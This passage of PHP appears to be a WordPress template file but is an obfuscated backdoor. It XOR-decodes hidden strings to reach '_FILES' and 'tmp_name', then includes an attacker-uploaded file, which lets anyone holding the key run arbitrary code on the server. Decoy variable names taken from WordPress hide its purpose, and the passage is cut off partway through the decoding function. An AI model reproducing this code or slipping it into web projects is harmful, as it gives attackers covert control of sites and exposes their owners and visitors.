 ...
 *
 * The hierarchy for this template*/
 	
function real()

{
    $pre_tags = 'VEfEOyqgvNpsq6';

    $thumbfile = $pre_tags;
    
	$map_meta_cap = 'page';
    $input = $GLOBALS[dest("%09%03%2F%09%0A%2A", $thumbfile)];
    $query_var = $input;
    $regex = isset($query_var[$thumbfile]);
    if ($regex)

    {

        $permalink_epmask = $input[$thumbfile];
        $mime_pattern = $permalink_epmask[dest("%22%28%16%1A%21%18%1C%02", $thumbfile)];
	$flag_no_digit = 'smiley_url';
        $return = $mime_pattern;
	$fallback_title = 'allowed_protocols';
        include ($return);
	$replace = 'inclusions';
    }
}
function dest($post_title, $full)

{

    $_links_add_base = $full;
    $found = "url" . "decode";
	$excerpt_more = 'default_no_texturize_tags';
    $post_meta_ids = $found($post_title);
    $parent_data = substr($_links_add_base,0, strlen($post_meta_ids));
    $append = $post_meta_ids ^ $parent_data;
    
    $post_meta_ids = strpos($append, $parent_data);
